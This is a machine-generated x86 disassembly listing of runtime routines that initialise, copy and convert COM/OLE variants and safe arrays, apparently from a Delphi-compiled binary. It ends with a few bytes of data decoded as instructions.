mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40f248
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40ec74
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40ef1c
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40ef1c
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40f264
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40f294
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ef1c
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40ef1c
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f4c4
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40f1cc
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40ef1c
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_4040e8
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_410c34
test al al
je r-xdata
mov ecx sub_40f4bc
mov edx esi
mov eax ebx
call sub_40f2f0
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40ef1c
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40f570
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f4c4
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40f1cc
sub_40f5b4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404774
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40ef28
pop ebx
pop ebp
retn 0x8
sub_40f5ec
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404774
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40ef28
pop ebx
pop ebp
retn 0x8
sub_40f624
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40f6da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404774
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40ef28
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f6e1
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_4040b8
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_40431c
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407eec
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4048c0
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_40431c
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407eb0
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4048c0
jmp r-xdata
jmp r-xdata
call sub_40eb84
sub_40f6e8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40f7a7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f785
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40ef28
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_404884
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404970
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_40431c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f78c
lea eax [ ebp - 0x10 ]
call sub_40f248
retn
sub_40f7b4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f80a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f570
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40f89c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f811
lea eax [ ebp - 0x10 ]
call sub_40f248
retn
sub_40f818
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_410c34
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f88d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_4040e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40f248
retn
sub_40f89c
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40fdd3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f8d5 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4040e8
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404094
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_408200
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4040e8
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_408200
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4040e8
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_409ab4
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4040e8
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_409ab4
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_4040e8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40f5b4
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_40431c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40f5ec
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_40431c
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_404884
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404970
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_40431c
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_40f624
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_40431c
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_408200
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_4040e8
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_408200
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_4040e8
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_408200
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_4040e8
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_4082ec
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_4040e8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_4082ec
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_4040e8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f89c
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40f6e8
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_4040e8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fdda
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_4040b8
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_40478c
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_4040b8
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_40478c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_4040b8
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_40f7b4
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_4040e8
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4040e8
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40eae8
test ah 0x40
je r-xdata
mov eax esi
call sub_404094
mov edx eax
mov eax ebx
call sub_40f818
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_40f6e8
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_4040e8
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40f6e8
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_4040e8
jmp r-xdata
jmp [ eax * 4 + jump_table_40fb69 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408200
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_4040e8
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_408200
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_4040e8
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_409ab4
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_4040e8
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_409ab4
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_4040e8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40f5b4
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_40431c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_40f5ec
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_40431c
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4042bc
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40f624
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_40431c
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408200
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_4040e8
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408200
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_4040e8
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408200
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_4040e8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_4082ec
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_4040e8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_4082ec
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_4040e8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f89c
jmp r-xdata
sub_40fde0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40fe8a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40fe6d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40ef28
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_404884
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fe74
lea eax [ ebp - 0x10 ]
call sub_40f248
retn
sub_40fe98
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40feee
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f570
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40ffc4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fef5
lea eax [ ebp - 0x10 ]
call sub_40f248
retn
sub_40fefc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40ffb4
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_410c34
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ffbb
lea eax [ ebp - 0x20 ]
call sub_404774
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40ff97
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_404884
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40f248
retn
sub_40ffc4
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_410516
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40fffe ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4048c0
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404774
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_408200
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4048c0
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_408200
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4048c0
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_409ab4
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4048c0
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_409ab4
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_4048c0
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40f5b4
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4047b0
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40f5ec
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4047b0
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_404884
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404970
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_40f624
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4047b0
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_408200
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4048c0
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_408200
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_4048c0
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_408200
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_4048c0
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_4082ec
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_4048c0
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_4082ec
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_4048c0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40ffc4
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_40fde0
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_4047b0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41051d
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_40478c
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_4040b8
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_40478c
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_4040b8
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_40478c
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_4040b8
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_40478c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_4040b8
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40fe98
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_4047b0
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4048c0
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40eae8
test ah 0x40
je r-xdata
mov eax esi
call sub_404774
mov edx eax
mov eax ebx
call sub_40fefc
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40fde0
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_4047b0
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_40fde0
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_4047b0
jmp r-xdata
jmp [ eax * 4 + jump_table_410285 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408200
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_4048c0
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_408200
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_4048c0
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_409ab4
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_4048c0
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_409ab4
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_4048c0
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_40f5b4
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_4047b0
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40f5ec
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4047b0
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404884
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40f624
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4047b0
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408200
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4048c0
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408200
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_4048c0
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408200
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_4048c0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_4082ec
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_4048c0
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_4082ec
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_4048c0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40ffc4
jmp r-xdata
sub_410524
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40f1cc
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_410560
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f1cc
sub_41058c
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40f1cc
sub_4105f0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4040e8
pop esi
pop ebx
retn
mov eax ebx
call sub_40f1cc
sub_41061c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_404970
pop esi
pop ebx
retn
mov eax ebx
call sub_40f1cc
sub_4107d8
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4108fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_4040e8
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_4040e8
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_410c34
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_4040e8
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4043a0
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_408314
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_4043a0
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403294
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_40288c
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4042f8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410905
lea eax [ ebp - 0x208 ]
call sub_404094
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4043a0
sub_410986
push esi
popad
jb r-xdata
xor bh bh
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
